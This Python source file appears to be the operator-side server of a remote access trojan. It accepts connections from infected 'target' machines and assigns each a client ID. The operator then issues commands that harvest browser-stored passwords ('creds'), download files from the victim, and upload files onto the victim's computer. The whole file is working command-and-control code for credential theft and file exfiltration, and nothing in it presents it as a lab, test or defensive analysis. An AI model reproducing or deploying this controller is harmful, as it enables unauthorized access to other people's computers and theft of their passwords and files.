import socket
import time
import sys

# Initializing and binding socket to address
address = ("localhost", 8080)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(address)
sock.listen(5)
print("server up and running\nListening for connections...\n")

clients = 0
i = 0


# a function for uploading a file to the target computer
def HandleUpload(file_path, con):
    try:
        file = open(file_path[2], "rb").read()
        message = f"CID {file_path[0]} file_accept: {file_path[2]}"
        con.send(message.encode())
        time.sleep(1)
        print("uploading file to target...")
        con.send(file)
        response = con.recv(1024)
        print(response.decode("utf-8"))
    except FileNotFoundError:
        print(f"{file_path[2]} does not exist, double check your path and spelling.\n")


# a function for downloading files from the target computer
def HandleDownload(data, con):
    """
    function that handles downloading files from the client
    """
    # giving the file a name based on the upload file's name and path
    global i
    try:
        filename = data.decode().strip("file:").replace("/", "").replace("\\", "")
    except UnicodeDecodeError:
        # Exception in case filename can't be decoded, idk why it happens and I really can't be bothered to spend any more time fixing it
        filename = f"{i}"
    i += 1

    # opening file and writing recieved data as bytes

    file = open(filename, "wb")
    buffer = b""
    while True:
        data = con.recv(4096)
        if data.__contains__(b"file:"):
            print("file download finished...\n moving on to next file")
            file.write(buffer)
            file.close()
            HandleDownload(data, con)
            break
        if not data:
            print("download finished.")
            file.write(buffer)
            file.close()
            break
        buffer += data


# handeling of the different commands
def HandleCommand(command, con):
    """
    Handeling commands sent by the user to the client and their response
    """
    # Handeling the "creds" command, getting (encrypted) browser stored passwords

    if command.lower().__contains__("creds"):
        con.send(f"CID {command}".encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
        else:
            print(response.decode("utf-8"))
        resp = input(">>>")
        con.send(resp.encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
            pass
        print(response.decode("utf-8"))
        response = con.recv(4096)
        if response.__contains__(b"file:"):
            HandleDownload(response, con)
        else:
            print(response)

    # Handeling the "download" command, downloading files from the client
    if command.lower().__contains__("download"):
        con.send(f"CID {command}".encode())
        response = con.recv(4096)
        if len(response) == 0:
            print("no response")
        else:
            HandleDownload(response, con)

    if command.lower().__contains__("upload"):
        file_path = command.split(" ")
        HandleUpload(file_path, con)

    else:
        pass


try:
    while True:
        con, addr = sock.accept()

        if con:
            print(f"got hook from {addr}")
            response = con.recv(4096)
            if response == b"CID_req":
                con.send(f"CID {str(clients)}".encode())
                clients += 1
            elif not response:
                command = input(">>>")
                if command == "":
                    continue
                HandleCommand(command, con)
            else:
                print(response.decode("utf-8"))

            command = input(">>>")
            if command == "":
                continue
            HandleCommand(command, con)


except KeyboardInterrupt:
    print("Interrupt recieved, exiting.\n")
    sock.close()
    sys.exit(1)
